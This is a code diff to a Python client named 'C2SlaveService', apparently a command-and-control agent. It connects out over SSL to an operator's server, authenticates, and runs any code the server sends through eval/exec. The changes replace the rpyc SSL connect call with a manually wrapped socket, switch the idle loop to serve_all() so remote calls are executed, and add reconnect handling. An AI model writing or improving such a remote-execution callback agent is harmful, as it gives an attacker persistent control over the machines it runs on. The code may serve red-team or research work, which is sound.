@@ -66,13 +66,14 @@ class C2SlaveService(SlaveService):
         exec_globals = {"__builtins__": __builtins__}
         exec_locals = {}
         
+        # 先尝试作为表达式求值
         try:
-            return eval(code, exec_globals, exec_locals)
+            result = eval(code, exec_globals, exec_locals)
+            return result
         except SyntaxError:
-            pass
-        
-        exec(code, exec_globals, exec_locals)
-        return exec_locals.get("result", None)
+            # 如果不是表达式，则作为语句执行
+            exec(code, exec_globals, exec_locals)
+            return exec_locals.get("result", None)
     
     def exposed_execute_in_context(self, code: str, context_id: str = None) -> Any:
         """
@@ -95,13 +96,14 @@ class C2SlaveService(SlaveService):
         if "__builtins__" not in ns:
             ns["__builtins__"] = __builtins__
         
+        # 先尝试作为表达式求值
         try:
-            return eval(code, ns, ns)
+            result = eval(code, ns, ns)
+            return result
         except SyntaxError:
-            pass
-        
-        exec(code, ns, ns)
-        return ns.get("result", None)
+            # 如果不是表达式，则作为语句执行
+            exec(code, ns, ns)
+            return ns.get("result", None)
     
     def exposed_get_context_var(self, name: str, context_id: str = None) -> Any:
         """获取上下文中的变量值"""
@@ -247,13 +249,21 @@ def connect_and_authenticate(host: str, port: int, password: str,
     
     logger.info(f"正在连接到 {host}:{port}...")
     
-    conn = rpyc.ssl_connect(
-        host=host,
-        port=port,
-        service=C2SlaveService,
-        config=config,
-        ssl_context=ssl_context,
-    )
+    # 创建原始 socket 连接
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((host, port))
+    
+    # 使用 SSL 上下文包装 socket
+    ssl_sock = ssl_context.wrap_socket(sock, server_hostname=server_hostname or host)
+    
+    logger.info("SSL 握手完成，正在建立 RPyC 连接...")
+    
+    # 使用已包装的 SSL socket 创建 RPyC 连接
+    from rpyc.utils.factory import connect_stream
+    from rpyc.core.stream import SocketStream
+    
+    stream = SocketStream(ssl_sock)
+    conn = connect_stream(stream, service=C2SlaveService, config=config)
     
     logger.info("SSL 连接已建立，正在认证...")
     
@@ -304,9 +314,12 @@ def run_client(host: str, port: int, password: str,
             heartbeat.start()
             logger.info(f"已连接，心跳间隔: {heartbeat_interval}秒")
             
-            # 保持连接活跃
-            while not conn.closed:
-                time.sleep(1)
+            # 保持连接活跃并处理请求
+            # 使用 serve_all() 来处理来自服务器的 RPC 请求
+            try:
+                conn.serve_all()
+            except (KeyboardInterrupt, EOFError):
+                logger.info("连接主动关闭")
             
             logger.warning("连接已断开")
             
@@ -316,6 +329,13 @@ def run_client(host: str, port: int, password: str,
             logger.error(str(e))
         except ssl.SSLError as e:
             logger.error(f"SSL 错误: {e}")
+        except KeyboardInterrupt:
+            logger.info("用户中断连接")
+            if not reconnect:
+                break
+            logger.info(f"{reconnect_interval} 秒后重连...")
+            time.sleep(reconnect_interval)
+            continue
         except Exception as e:
             logger.exception(f"未预期的错误: {e}")
         finally:
